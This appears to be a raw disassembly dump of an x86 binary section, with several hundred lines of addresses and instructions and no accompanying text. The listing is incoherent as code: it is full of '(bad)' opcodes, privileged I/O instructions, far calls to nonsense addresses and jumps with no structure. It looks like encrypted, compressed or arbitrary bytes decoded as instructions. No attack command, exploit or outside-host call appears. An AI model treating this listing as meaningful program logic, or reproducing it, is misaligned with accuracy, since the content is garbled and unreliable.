  41d2b4:	cmp    DWORD PTR [edx+ebx*2-0x88b8deb],esi
  41d2bb:	mov    al,ds:0x472f0ec5
  41d2c0:	(bad)  
  41d2c1:	sub    al,0xe0
  41d2c3:	push   esp
  41d2c4:	fsub   QWORD PTR [eax-0x694ec2aa]
  41d2ca:	fwait
  41d2cb:	dec    esp
  41d2cc:	fs jmp 0x47666174
  41d2d2:	cmc    
  41d2d3:	or     eax,DWORD PTR [edx-0x67]
  41d2d6:	mov    dl,0xc9
  41d2d8:	outs   dx,DWORD PTR ds:[esi]
  41d2d9:	(bad)  
  41d2da:	into   
  41d2db:	retf   0xcfaa
  41d2de:	outs   dx,BYTE PTR ds:[esi]
  41d2df:	xchg   edx,eax
  41d2e0:	and    esp,edx
  41d2e2:	or     cl,dh
  41d2e4:	loop   0x41d270
  41d2e6:	jmp    DWORD PTR [edx+0x771bb5d8]
  41d2ed:	mov    esi,DWORD PTR [edi+0x70]
  41d2f0:	xchg   edx,eax
  41d2f1:	fs vpmaxsw ymm6,ymm5,ymm7
  41d2f6:	out    dx,al
  41d2f7:	popf   
  41d2f8:	fwait
  41d2f9:	cmp    DWORD PTR [ebx],ecx
  41d2fb:	adc    eax,edi
  41d2fd:	dec    eax
  41d2fe:	sbb    ebx,DWORD PTR [edi-0x23c2af05]
  41d304:	or     al,0x2f
  41d306:	mov    edx,0x7735f5e8
  41d30b:	mov    dl,0xd3
  41d30d:	pop    es
  41d30e:	dec    eax
  41d30f:	rcr    DWORD PTR [edx+eax*8],0xd1
  41d313:	inc    ecx
  41d314:	xor    ebx,DWORD PTR [edx+edi*1-0x4e]
  41d318:	pop    es
  41d319:	addr16 push edi
  41d31b:	cdq    
  41d31c:	adc    DWORD PTR [esi-0x3ce20994],0xffffffd1
  41d323:	retf   0x182a
  41d326:	mov    dl,0x8f
  41d328:	nop
  41d329:	pop    esi
  41d32a:	fnstsw WORD PTR ds:0x19e6bc60
  41d330:	std    
  41d331:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d332:	inc    edi
  41d333:	and    BYTE PTR [ebx+edi*8-0x4c],0x39
  41d338:	clc    
  41d339:	push   eax
  41d33a:	shl    BYTE PTR [eax],0x49
  41d33d:	jb     0x41d381
  41d33f:	in     al,dx
  41d340:	hlt    
  41d341:	sar    BYTE PTR es:[ecx-0x6e],1
  41d345:	mov    ah,0x47
  41d347:	fiadd  DWORD PTR [edx-0x78a08f97]
  41d34d:	push   esi
  41d34e:	pop    ebx
  41d34f:	pop    eax
  41d350:	ins    DWORD PTR es:[edi],dx
  41d351:	and    esi,DWORD PTR [ebx+0x4d2a3b6c]
  41d357:	xchg   esp,eax
  41d358:	bound  ecx,QWORD PTR [esi+0x796a4965]
  41d35e:	jge    0x41d315
  41d360:	repz sti 
  41d362:	adc    edi,ebx
  41d364:	inc    edi
  41d365:	dec    edi
  41d366:	jp     0x41d302
  41d368:	mov    DWORD PTR [eax*4+0x7c1c7f08],ecx
  41d36f:	push   edx
  41d370:	mov    al,0x9b
  41d372:	xor    al,0x6c
  41d374:	rcl    BYTE PTR [ebx-0x59],1
  41d377:	xor    BYTE PTR [ebx-0x1dcdfa9b],al
  41d37d:	cmp    DWORD PTR [ebx+eiz*1-0x2],esp
  41d381:	dec    esp
  41d382:	jae    0x41d3bf
  41d384:	mov    BYTE PTR [ebx],ah
  41d386:	cmp    BYTE PTR [eax+0x279f8c50],cl
  41d38c:	mov    ch,0x43
  41d38e:	mov    ebp,0x6ebc58d2
  41d393:	sub    eax,0x1aae9539
  41d398:	xchg   edx,eax
  41d399:	popf   
  41d39a:	call   0x7a5e:0x9d37ab65
  41d3a1:	rcr    BYTE PTR [ebx-0x52df0fe9],1
  41d3a7:	xor    esp,DWORD PTR [ebx]
  41d3a9:	ret    0xf20c
  41d3ac:	jp     0x41d406
  41d3ae:	inc    ebx
  41d3af:	or     DWORD PTR [eax-0x8],edx
  41d3b2:	inc    edi
  41d3b3:	cmc    
  41d3b4:	data16 cli 
  41d3b6:	stc    
  41d3b7:	sbb    eax,0x8cc9ce7e
  41d3bc:	jno    0x41d3b9
  41d3be:	pop    es
  41d3bf:	jg     0x41d3a4
  41d3c1:	mov    dl,0x4
  41d3c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d3c4:	push   ecx
  41d3c5:	ret    0x9610
  41d3c8:	int3   
  41d3c9:	mov    ds:0xbf1a2f82,eax
  41d3ce:	push   ebx
  41d3cf:	add    eax,0x22ca2300
  41d3d4:	clc    
  41d3d5:	and    esp,ebp
  41d3d7:	mov    BYTE PTR [ecx],al
  41d3d9:	retf   
  41d3da:	fucomip st,st(1)
  41d3dc:	inc    esi
  41d3dd:	mov    eax,0x88bac41
  41d3e2:	mov    edx,0x2431feca
  41d3e7:	dec    esp
  41d3e8:	int    0xc5
  41d3ea:	push   0xffffff84
  41d3ec:	cmc    
  41d3ed:	neg    DWORD PTR [esi]
  41d3ef:	stos   BYTE PTR es:[edi],al
  41d3f0:	mov    esi,0xefcdbf39
  41d3f5:	rcr    DWORD PTR ds:0xc0b2a35c,cl
  41d3fb:	mov    ecx,0x871c567e
  41d400:	dec    esp
  41d401:	nop
  41d402:	mov    bh,0x95
  41d404:	mov    cl,0x68
  41d406:	daa    
  41d407:	xor    edi,ebx
  41d409:	inc    edi
  41d40a:	push   ds
  41d40b:	sahf   
  41d40c:	pop    eax
  41d40d:	mov    ebp,0xcb97a6e0
  41d412:	test   al,0x46
  41d414:	adc    bh,cl
  41d416:	jno    0x41d44c
  41d418:	push   cs
  41d419:	sbb    esi,ebx
  41d41b:	ins    BYTE PTR es:[edi],dx
  41d41c:	mov    ds:0x69d9ebba,eax
  41d421:	or     ch,ah
  41d423:	xchg   esi,eax
  41d424:	push   ecx
  41d425:	push   esp
  41d426:	add    al,0xb5
  41d428:	into   
  41d429:	outs   dx,DWORD PTR ds:[esi]
  41d42a:	jmp    0x8e7e3727
  41d42f:	pop    esi
  41d430:	jecxz  0x41d3b4
  41d432:	(bad)  
  41d433:	je     0x41d444
  41d435:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d436:	test   BYTE PTR [edx+eiz*1+0x6790fc1a],ch
  41d43d:	mov    al,0x8
  41d43f:	xchg   BYTE PTR [edi+0x67],al
  41d442:	int3   
  41d443:	dec    esi
  41d444:	push   0x5603e45f
  41d449:	inc    ebx
  41d44a:	dec    ebx
  41d44b:	test   BYTE PTR [ebp+ebx*4+0x21405824],dh
  41d452:	and    al,0xb4
  41d454:	adc    esi,ebp
  41d456:	loope  0x41d4a9
  41d458:	fisttp QWORD PTR [ecx]
  41d45a:	in     eax,dx
  41d45b:	pop    eax
  41d45c:	mov    bh,0xc8
  41d45e:	or     dl,BYTE PTR [ebx-0x4407fe1f]
  41d464:	scas   al,BYTE PTR es:[edi]
  41d465:	pop    ecx
  41d466:	xor    DWORD PTR ds:0xd421ad0d,edx
  41d46c:	in     al,dx
  41d46d:	(bad)
  41d470:	int3   
  41d471:	dec    edx
  41d472:	inc    edi
  41d473:	sbb    eax,0x4aca0284
  41d478:	push   ds
  41d479:	(bad)
  41d47d:	jl     0x41d4b6
  41d47f:	sbb    DWORD PTR [esi],ebp
  41d481:	jne    0x41d4b2
  41d483:	xchg   esp,eax
  41d484:	dec    esp
  41d485:	ss jl  0x41d472
  41d488:	rol    DWORD PTR [edx],cl
  41d48a:	xchg   ebx,eax
  41d48b:	cdq    
  41d48c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d48d:	arpl   si,sp
  41d48f:	jl     0x41d50a
  41d491:	add    ebx,DWORD PTR [esp+eiz*8-0x44a49803]
  41d498:	jne    0x41d47b
	...
  41d512:	add    BYTE PTR [eax],al
  41d514:	daa    
  41d515:	and    eax,0xbb873b85
  41d51a:	mov    edi,0xe22d13d
  41d51f:	pusha  
  41d520:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d521:	push   ebx
  41d522:	not    DWORD PTR [edx+0x171ad]
  41d528:	outs   dx,BYTE PTR ds:[esi]
  41d529:	pop    es
  41d52a:	add    BYTE PTR [eax],al
  41d52c:	and    BYTE PTR [esi+0x3a],0x35
  41d530:	out    dx,al
  41d531:	(bad)  
  41d532:	(bad)  
  41d533:	or     BYTE PTR [eax+0x6655ba03],ah
  41d539:	retf   
  41d53a:	in     al,dx
  41d53b:	lds    esi,FWORD PTR [edx-0x588d378d]
  41d541:	mov    ah,0x3f
  41d543:	(bad)  
  41d544:	push   ebx
  41d546:	clc    
  41d547:	sub    BYTE PTR [ebx],dh
  41d549:	dec    ebp
  41d54a:	mov    eax,esp
  41d54c:	xchg   edx,ebx
  41d54e:	int    0x7d
  41d550:	pop    edx
  41d551:	push   edi
  41d552:	and    ch,BYTE PTR gs:[ebx+0x74926818]
  41d559:	push   ss
  41d55a:	stos   DWORD PTR es:[edi],eax
  41d55b:	mov    ds:0x8ca7bf15,al
  41d560:	ja     0x41d4e9
  41d562:	out    0x46,eax
  41d564:	inc    BYTE PTR [ecx+ebx*2]
  41d567:	jno    0x41d4ec
  41d569:	fidiv  DWORD PTR [edi+0x7d]
  41d56c:	push   cs
  41d56d:	jle    0x41d5b8
  41d56f:	je     0x41d5f0
  41d571:	dec    esp
  41d572:	sub    DWORD PTR [eax+0x2c],ebp
  41d575:	mov    ch,0xf6
  41d577:	xchg   ebp,eax
  41d578:	mov    dl,0x4
  41d57a:	enter  0xb38d,0x71
  41d57e:	sbb    eax,0xac76bc81
  41d583:	adc    edi,DWORD PTR [esi+edx*1+0x41076cf]
  41d58a:	cwde   
  41d58b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d58c:	clc    
  41d58d:	xchg   esp,eax
  41d58e:	pop    eax
  41d58f:	aad    0x40
  41d591:	cmp    ch,BYTE PTR [ecx+0x5b642b19]
  41d597:	repnz mov ah,0xea
  41d59a:	mov    BYTE PTR [edi+edx*1+0x7d],ch
  41d59e:	ret    0xdc1
  41d5a1:	aaa    
  41d5a2:	xlat   BYTE PTR ds:[ebx]
  41d5a3:	repz fs add bh,BYTE PTR gs:[edi]
  41d5a8:	outs   dx,DWORD PTR ds:[esi]
  41d5a9:	lea    edi,[edi]
  41d5ab:	and    eax,0xa7ac36e2
  41d5b0:	fidivr DWORD PTR [ebx+esi*8+0x23]
  41d5b4:	out    dx,al
  41d5b5:	mov    eax,0x9deb438d
  41d5ba:	arpl   WORD PTR [eax],si
  41d5bc:	jb     0x41d595
  41d5be:	pushf  
  41d5bf:	retf   0x6354
  41d5c2:	in     eax,dx
  41d5c3:	mov    ah,0xa7
  41d5c5:	(bad)  
  41d5c6:	xchg   BYTE PTR [esi+0x2],ch
  41d5c9:	test   BYTE PTR [ecx-0x7d],bl
  41d5cc:	or     eax,0xbc3ff33c
  41d5d1:	jp     0x41d596
  41d5d3:	mov    edi,0x5c0f42a6
  41d5d8:	fiadd  WORD PTR [eax]
  41d5da:	mov    ebx,0x39d3ad5
  41d5df:	add    BYTE PTR [edi-0x15],ah
  41d5e2:	and    cl,bl
  41d5e4:	rol    BYTE PTR [eax],1
  41d5e6:	fs cdq 
  41d5e8:	loope  0x41d661
  41d5ea:	cmp    eax,0x2fde2ee1
  41d5ef:	sbb    eax,0x5e311470
  41d5f4:	(bad)  
  41d5f5:	test   al,0x9d
  41d5f7:	pop    es
  41d5f8:	ficom  WORD PTR [edi]
  41d5fa:	mov    ebp,0x8f564c66
  41d5ff:	dec    ecx
  41d600:	addr16 jg 0x41d63f
  41d603:	out    dx,al
  41d604:	adc    ecx,0x61447e96
  41d60a:	iret   
  41d60b:	push   ebx
  41d60c:	xor    esi,DWORD PTR [ebx-0x31c00fd6]
  41d612:	in     eax,0xed
  41d614:	adc    al,0x97
  41d616:	popf   
  41d617:	in     al,0xef
  41d619:	sahf   
  41d61a:	ret    
  41d61b:	fdiv   QWORD PTR [esi+0x34]
  41d61e:	stc    
  41d61f:	cli    
  41d620:	arpl   sp,bp
  41d622:	sub    edi,DWORD PTR [edx]
  41d624:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d625:	jbe    0x41d69b
  41d627:	ja     0x41d607
  41d629:	mov    dh,0x73
  41d62b:	xchg   edx,eax
  41d62d:	mov    dh,0x4e
  41d62f:	jmp    0x41d698
  41d631:	xchg   ecx,eax
  41d632:	in     al,0x28
  41d634:	push   esi
  41d635:	fucomp st(6)
  41d637:	push   esp
  41d638:	clc    
  41d639:	icebp  
  41d63a:	mov    eax,0x3b7b5db7
  41d63f:	xchg   esi,eax
  41d640:	dec    ebx
  41d641:	adc    dh,BYTE PTR [edi]
  41d643:	fsubr  DWORD PTR [ebx-0x6202d132]
  41d649:	and    BYTE PTR [edi],0xa1
  41d64c:	dec    esp
  41d64d:	cld    
  41d64e:	or     ebx,DWORD PTR [ebp-0x3c]
  41d651:	imul   DWORD PTR [ebx+0x4b]
  41d654:	or     BYTE PTR [ebp+edi*2+0x3c9bf642],0xcd
  41d65c:	repnz push esi
  41d65e:	ret    
  41d65f:	xlat   BYTE PTR ds:[ebx]
  41d660:	out    0x6f,eax
  41d662:	in     eax,dx
  41d663:	cmp    ebp,DWORD PTR [edi-0x6969a863]
  41d669:	js     0x41d6d0
  41d66b:	xor    BYTE PTR [edx],al
  41d66d:	js     0x41d5f3
  41d66f:	lods   eax,DWORD PTR ds:[esi]
  41d670:	jg     0x41d607
  41d672:	add    al,0x58
  41d674:	push   eax
  41d675:	out    0x3c,al
  41d677:	and    eax,DWORD PTR [edi+0x514f2b83]
  41d67d:	fidiv  WORD PTR [esi-0x1d584e77]
  41d683:	or     eax,0x1b077ce
  41d688:	push   0xfffffffd
  41d68a:	sub    DWORD PTR [edx+0x7],0x42
  41d68e:	dec    ecx
  41d68f:	repz jp 0x41d683
  41d692:	push   es
  41d693:	adc    al,0xe7
  41d695:	bound  eax,QWORD PTR [ecx]
  41d697:	pop    es
  41d698:	sub    BYTE PTR [ebp+0x6f03080e],bh
  41d69e:	fdiv   DWORD PTR [edx]
  41d6a0:	out    0xe5,al
  41d6a2:	das    
  41d6a3:	stc    
  41d6a4:	js     0x41d6ab
  41d6a6:	mov    ch,0x1a
  41d6a8:	or     esp,DWORD PTR [ebx+eax*1+0x42]
  41d6ac:	daa    
  41d6ad:	mov    ebp,0xfb2d0741
  41d6b2:	xchg   edi,eax
  41d6b3:	or     esi,DWORD PTR fs:[ecx-0x6]
  41d6b7:	std    
  41d6b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d6b9:	rol    BYTE PTR [ebx],cl
  41d6bb:	dec    edi
  41d6bc:	xor    eax,0x3ab1e035
  41d6c1:	cmp    DWORD PTR [ebx],edi
  41d6c3:	in     al,dx
  41d6c4:	mov    ch,0x4c
  41d6c6:	(bad)  
  41d6c7:	mov    ds:0xee4a08a2,al
  41d6cc:	pop    ecx
  41d6cd:	mov    ds:0xeef87554,al
  41d6d2:	jmp    0xa645df9a
  41d6d7:	rcr    BYTE PTR [esi-0x4720920f],cl
  41d6dd:	mov    eax,0x42f2b242
  41d6e2:	daa    
  41d6e3:	mov    al,al
  41d6e5:	jnp    0x41d71b
  41d6e7:	iret   
  41d6e8:	fisubr DWORD PTR [ebx+eax*1+0x4a]
  41d6ec:	or     esi,edi
  41d6ee:	sbb    al,0x50
  41d6f0:	cmp    dh,cl
  41d6f2:	ins    BYTE PTR es:[edi],dx
  41d6f3:	add    eax,0xc85a3f6
  41d6f8:	sbb    al,0xf5
  41d6fa:	aas    
  41d6fb:	jmp    0x41d6e4
  41d6fd:	jmp    DWORD PTR [ebp-0x38]
  41d700:	stc    
  41d701:	pop    ebp
  41d702:	jg     0x41d6a1
  41d704:	aaa    
  41d705:	scas   al,BYTE PTR es:[edi]
  41d706:	push   edx
  41d707:	cdq    
  41d708:	pushf  
  41d709:	sub    BYTE PTR [eax],ah
  41d70b:	ret    0xb6d0
  41d70e:	mov    ch,0x8d
  41d710:	in     eax,dx
  41d711:	sub    DWORD PTR [eax],eax
  41d713:	mov    edx,0xcd78387e
  41d718:	sub    DWORD PTR [edi+esi*8-0x38],edx
  41d71c:	or     BYTE PTR [ecx+0x20c98dba],dh
  41d722:	dec    esp
  41d723:	jno    0x41d6db
  41d725:	adc    al,0x75
  41d727:	fcom   DWORD PTR [edx-0x2f]
  41d72a:	icebp  
  41d72b:	sub    DWORD PTR [edi-0x13fd6b9a],eax
  41d731:	mov    esp,0x1f7f5b00
  41d736:	das    
  41d737:	xchg   edx,eax
  41d738:	cs stc 
  41d73a:	leave  
  41d73b:	iret   
  41d73c:	pop    es
  41d73d:	iret   
  41d73e:	push   edi
  41d73f:	lea    edi,[esi+ebp*4-0x4ed0f4e8]
  41d746:	add    bh,ah
  41d748:	lds    edi,FWORD PTR [ecx+0x60ed6fa6]
  41d74e:	dec    edi
  41d74f:	add    al,0x8
  41d751:	scas   al,BYTE PTR es:[edi]
  41d752:	retf   0x6dc7
  41d755:	jp     0x41d7c1
  41d757:	inc    sp
  41d759:	cwde   
  41d75a:	mov    ecx,0xd464a4d2
  41d75f:	lock jns 0x41d75a
  41d762:	test   DWORD PTR [ecx+eax*1+0x8],esp
  41d766:	imul   ecx,DWORD PTR [ebx-0x55],0x53e5e1e3
  41d76d:	dec    edx
  41d76e:	ror    BYTE PTR [ebx+0x31],1
  41d771:	out    0x1c,al
  41d773:	mov    esp,ss
  41d775:	test   DWORD PTR [eiz*1+0x27569c5f],esp
  41d77c:	cld    
  41d77d:	pop    es
  41d77e:	xchg   ebp,eax
  41d77f:	and    esp,esi
  41d781:	mov    ebp,0x9e5f4b51
  41d786:	xor    BYTE PTR [ebx+0x685bc4b],cl
  41d78c:	adc    al,0xd8
  41d78e:	ret    0xd72a
  41d791:	adc    ch,dl
  41d793:	mov    cl,0xc0
  41d795:	aam    0x27
  41d797:	mov    edx,0x2a792746
  41d79c:	retf   0x849a
  41d79f:	into   
  41d7a0:	(bad)  
  41d7a1:	hlt    
  41d7a2:	ror    ah,cl
  41d7a4:	xchg   esi,eax
  41d7a5:	sub    DWORD PTR [eax+0xd49e1e1],edx
  41d7ab:	out    dx,eax
  41d7ac:	inc    esp
  41d7ad:	fist   WORD PTR [edx]
  41d7af:	pop    esp
  41d7b0:	xchg   ebp,eax
  41d7b1:	popa   
  41d7b2:	jp     0x41d783
  41d7b4:	mov    edx,0x52259653
  41d7b9:	pop    ebp
  41d7ba:	pop    ds
  41d7bb:	mov    ch,0xaf
  41d7bd:	xor    DWORD PTR [ebx+0x1429728b],ecx
  41d7c3:	pop    ecx
  41d7c4:	push   es
  41d7c5:	and    bh,BYTE PTR [esi]
  41d7c7:	xor    DWORD PTR [edi+0x72b45e98],edx
  41d7cd:	inc    esp
  41d7ce:	outs   dx,BYTE PTR ds:[esi]
  41d7cf:	mov    esp,0x4fec2fc0
  41d7d4:	dec    ebp
  41d7d5:	in     al,0xb
  41d7d7:	icebp  
  41d7d8:	jp     0x41d844
  41d7da:	mov    ah,0x1c
  41d7dc:	(bad)  
  41d7dd:	xor    eax,0xe9287a9e
  41d7e2:	pop    edx
  41d7e3:	fstp   DWORD PTR [esi+ecx*8-0x55]
  41d7e7:	pop    ss
  41d7e8:	mov    ebp,0x2e85cf41
  41d7ed:	push   0x10
  41d7ef:	mov    dh,dh
  41d7f1:	xor    eax,0x9b3fc940
  41d7f6:	repnz push 0xffffffd6
  41d7f9:	jle    0x41d86c
  41d7fb:	int3   
  41d7fc:	test   DWORD PTR [edi+edx*2+0x237ffb49],0x9c142b4f
  41d807:	mov    ch,0x85
  41d809:	jge    0x41d791
  41d80b:	pop    esi
  41d80c:	out    0xa2,eax
  41d80e:	cdq    
  41d80f:	inc    ebx
  41d810:	pop    ds
  41d811:	out    0x8e,al
  41d813:	inc    ecx
  41d814:	fcom   QWORD PTR [ecx]
  41d816:	mov    ah,0x25
  41d818:	ins    DWORD PTR es:[edi],dx
  41d819:	xor    eax,0x82c46005
  41d81e:	dec    edx
  41d81f:	or     dh,ch
  41d821:	sub    BYTE PTR [esi],al
  41d823:	mov    ch,0x1a
  41d825:	push   ds
  41d826:	xchg   ebx,eax
  41d827:	mov    eax,ds:0x16a2990e
  41d82c:	dec    DWORD PTR [ecx]
  41d82e:	sub    eax,eax
  41d830:	fs leave 
  41d832:	mov    BYTE PTR [ebp+0x61],0x3e
  41d836:	ret    0x1364
  41d839:	mov    edx,0xd818b84d
  41d83e:	dec    ecx
  41d83f:	iret   
  41d840:	lahf   
  41d841:	clc    
  41d842:	imul   ecx,DWORD PTR [ebx],0x3581346e
  41d848:	pop    eax
  41d849:	fdiv   DWORD PTR [bp+si+0x2615]
  41d84e:	pop    esp
  41d84f:	fld    QWORD PTR [edx+0x3a794b7]
  41d855:	dec    edx
  41d856:	jb     0x41d83f
  41d858:	sar    eax,cl
  41d85a:	into   
  41d85b:	enter  0xcb61,0x40
  41d85f:	pusha  
  41d860:	mov    dh,0x4a
  41d862:	xchg   edx,eax
  41d863:	pop    edi
  41d864:	mov    ebx,0x31a62796
  41d869:	and    al,0x66
  41d86b:	out    dx,al
  41d86c:	pop    ebp
  41d86d:	fiadd  WORD PTR [edi+edx*2-0x1]
  41d871:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d872:	jbe    0x41d86f
  41d874:	and    DWORD PTR [eax-0x2a],ecx
  41d877:	test   al,0x6c
  41d879:	ins    DWORD PTR es:[edi],dx
  41d87a:	adc    BYTE PTR [ecx],bh
  41d87c:	je     0x41d7ff
  41d87e:	xchg   ebx,eax
  41d87f:	adc    bl,dh
  41d881:	adc    BYTE PTR [eax+0x5aaebc6b],al
  41d887:	and    esp,DWORD PTR [ebx-0x1b]
  41d88a:	inc    edi
  41d88b:	arpl   WORD PTR [esi+0x4d6adfca],dx
  41d891:	inc    ebx
  41d892:	ror    BYTE PTR [eax+0x7a3ad320],0x9e
  41d899:	pop    ss
  41d89a:	pop    ds
  41d89b:	ret    0x68ec
  41d89e:	and    ebp,ebp
  41d8a0:	and    al,0x32
  41d8a2:	dec    edx
  41d8a3:	clc    
  41d8a4:	fld    QWORD PTR [ebx+edi*2+0x15]
  41d8a8:	pop    edi
  41d8a9:	and    BYTE PTR [esi+0x47e91143],dl
  41d8af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d8b0:	push   0xb722fb21
  41d8b5:	or     DWORD PTR [esi+0x0],esi
  41d8b8:	sub    eax,0x88d4e15c
  41d8bd:	(bad)  
  41d8be:	fcmovb st,st(1)
  41d8c0:	cdq    
  41d8c1:	(bad)  
  41d8c2:	xchg   edi,eax
  41d8c3:	push   ds
  41d8c4:	dec    ecx
  41d8c5:	add    bl,BYTE PTR es:[ebx]
  41d8c8:	sbb    ch,BYTE PTR [ecx+0x2f2e4a]
  41d8ce:	(bad)  
  41d8cf:	mov    dl,0x5b
  41d8d1:	mov    al,BYTE PTR [edi-0x1eddb22]
  41d8d7:	pop    ss
  41d8d8:	std    
  41d8d9:	inc    ebx
  41d8da:	test   BYTE PTR [eax],cl
  41d8dc:	push   edx
  41d8dd:	and    al,0xbd
  41d8df:	mov    eax,ds:0x67231803
  41d8e4:	das    
  41d8e5:	add    eax,0xd7fa1127
  41d8ea:	inc    DWORD PTR [eax]
  41d8ec:	clc    
  41d8ed:	xchg   esp,eax
  41d8ee:	into   
  41d8ef:	retf   0x2a43
  41d8f2:	dec    ecx
  41d8f3:	xor    DWORD PTR [ebp+eax*1-0x4c],esi
  41d8f7:	ret    0xa85d
  41d8fa:	aas    
  41d8fb:	sub    eax,0xaac8318a
  41d900:	retf   0xc9ab
  41d903:	inc    ecx
  41d904:	ret    
  41d905:	add    ch,bh
  41d907:	out    0xf4,al
  41d909:	cmp    al,0xf9
  41d90b:	in     al,dx
  41d90c:	xchg   edi,eax
  41d90d:	lods   al,BYTE PTR ds:[esi]
  41d90e:	push   cs
  41d90f:	fwait
  41d910:	mov    esi,0x40eb20a5
  41d915:	push   esi
  41d916:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d917:	sub    ecx,DWORD PTR [edi]
  41d919:	adc    eax,0xfcdc7abb
  41d91e:	test   eax,0xd88a96c8
  41d923:	ficom  DWORD PTR [ebx]
  41d925:	and    BYTE PTR [eax],cl
  41d927:	cmp    eax,0x72712c52
  41d92c:	hlt    
  41d92d:	and    esi,DWORD PTR [ecx-0x579e728d]
  41d933:	mov    bl,0x41
  41d935:	call   0xbcf9:0xb6fd92b1
  41d93c:	addr16 adc edi,eax
  41d93f:	(bad)  
  41d940:	mov    ds:0x9b6a3c84,eax
  41d945:	and    cl,0x5c
  41d948:	stos   DWORD PTR es:[edi],eax
  41d949:	mov    ds:0x1beee6fc,eax
  41d94e:	mov    ds:0xd725dad7,eax
  41d953:	adc    bl,cl
  41d955:	mov    esp,0x82dad6df
  41d95a:	xchg   esi,eax
  41d95b:	cmp    eax,0x6dce374e
  41d960:	shl    bh,1
  41d962:	mov    dh,0x91
  41d964:	nop
  41d965:	sub    DWORD PTR [edi+0xa2d11d9],edx
  41d96b:	sbb    cl,BYTE PTR [edx-0x13e05941]
  41d971:	scas   eax,DWORD PTR es:[edi]
  41d972:	loope  0x41d9e1
  41d974:	aam    0x84
  41d976:	xchg   esi,eax
  41d977:	and    eax,DWORD PTR [ecx-0x20]
  41d97a:	mov    ebx,0x8ecf74db
  41d97f:	addr16 mov ecx,0x68fea59d
  41d985:	sbb    eax,0x83aba137
  41d98a:	stc    
  41d98b:	jnp    0x41d9fe
  41d98d:	or     al,0xa3
  41d98f:	or     DWORD PTR [eax+0x1fa5c765],0xffffffb6
  41d996:	inc    ebp
  41d997:	inc    esi
  41d998:	or     BYTE PTR [eax+0x70013aea],al
  41d99e:	or     al,0xb5
  41d9a0:	rcr    ch,cl
  41d9a2:	int    0x35
  41d9a4:	not    BYTE PTR [ebx+ebp*8]
  41d9a7:	dec    ebp
  41d9a8:	test   eax,0x59a640dc
  41d9ad:	loopne 0x41d9b3
  41d9af:	push   ds
  41d9b0:	and    al,0xcc
  41d9b2:	sub    edx,DWORD PTR [edi+0x47fade06]
  41d9b8:	jns    0x41d9f3
  41d9ba:	(bad)  
  41d9bc:	clc    
  41d9bd:	stos   DWORD PTR es:[edi],eax
  41d9be:	mov    ds:0xf63a900,eax
  41d9c3:	imul   edx,DWORD PTR [edx-0x645dbad3],0xc91b8f0b
  41d9cd:	mov    dh,BYTE PTR [eax+0x6c890c78]
  41d9d3:	frstpm(287 only) 
  41d9d5:	dec    BYTE PTR [edx-0x2]
  41d9d8:	fidivr DWORD PTR [edi-0x787e6883]
  41d9de:	sub    BYTE PTR [ebp+0x24],ch
  41d9e1:	mov    ebx,0xa2dd7605
  41d9e6:	mov    cl,0x35
  41d9e8:	lods   al,BYTE PTR ds:[esi]
  41d9e9:	test   DWORD PTR [edx],ebp
  41d9eb:	jbe    0x41d970
  41d9ed:	jg     0x41d981
  41d9ef:	dec    esp
  41d9f0:	je     0x41d9e8
  41d9f2:	dec    eax
  41d9f3:	mov    DWORD PTR [esi],ebx
  41d9f5:	jle    0x41d9bb
  41d9f7:	data16 jno 0x41d9c0
  41d9fa:	mov    al,0x4d
  41d9fc:	ror    BYTE PTR [ebx],cl
  41d9fe:	cmp    edi,DWORD PTR [edx]
  41da00:	pusha  
  41da01:	jg     0x41da3f
  41da03:	push   edi
  41da04:	xor    al,0xa0
  41da06:	and    esp,DWORD PTR [edx+0x6abd1326]
  41da0c:	jbe    0x41da3e
  41da0e:	xchg   ebx,eax
  41da0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da10:	into   
  41da11:	xchg   ebx,eax
  41da12:	push   ss
  41da13:	(bad)  
  41da14:	adc    BYTE PTR [edx-0x77cee7c8],dh
  41da1a:	xor    ecx,DWORD PTR [edi]
  41da1c:	adc    BYTE PTR [ebx+0xa258758],bl
  41da22:	xor    esp,DWORD PTR [ebx+0x5f2efb75]
  41da28:	xchg   DWORD PTR [ebp+0x6ce2c881],ebp
  41da2e:	es call 0x3554dbad
  41da34:	setns  BYTE PTR [ecx-0x29]
  41da38:	jg     0x41d9c1
  41da3a:	mov    cl,cl
  41da3c:	jo     0x41da74
  41da3e:	dec    edx
  41da3f:	cmp    cl,BYTE PTR [esi+0x63]
  41da42:	push   ss
  41da43:	out    0x40,eax
  41da45:	jp     0x41da68
  41da47:	cs in  al,0x8
  41da4a:	add    eax,0xb19feda2
  41da4f:	xchg   esi,eax
  41da50:	push   0xec31a869
  41da55:	(bad)  
  41da56:	bound  ebp,QWORD PTR [esi-0x5e]
  41da59:	les    edx,FWORD PTR [edx-0x31]
  41da5c:	jecxz  0x41daa4
  41da5e:	xor    DWORD PTR [ebp-0x27539c6f],0xd3f1cbf5
  41da68:	mov    edx,0xa1f75bb
  41da6d:	pcmpeqw mm1,mm1
  41da70:	data16 ja 0x41dab2
  41da73:	mov    dl,0xae
  41da75:	xor    BYTE PTR [ecx-0x9fbc33b],0xee
  41da7c:	scas   al,BYTE PTR es:[edi]
  41da7d:	icebp  
  41da7e:	xor    DWORD PTR [eax-0x50],0xffffffad
  41da82:	sahf   
  41da83:	pop    ebp
  41da84:	adc    DWORD PTR [esi],esi
  41da86:	mov    ebx,0xd88445da
  41da8b:	mov    ebp,0x6aeda4ba
  41da90:	sub    DWORD PTR [ebx],ecx
  41da92:	int3   
  41da93:	rcl    DWORD PTR [edi],0x47
  41da96:	push   eax
  41da97:	jge    0x41dadc
  41da99:	je     0x41da1f
  41da9b:	ja     0x41da76
  41da9d:	rcr    DWORD PTR [ebp+0x69],1
  41daa0:	inc    edx
  41daa1:	dec    edx
  41daa2:	inc    ecx
  41daa3:	add    al,0x23
  41daa5:	pop    es
  41daa6:	pop    esi
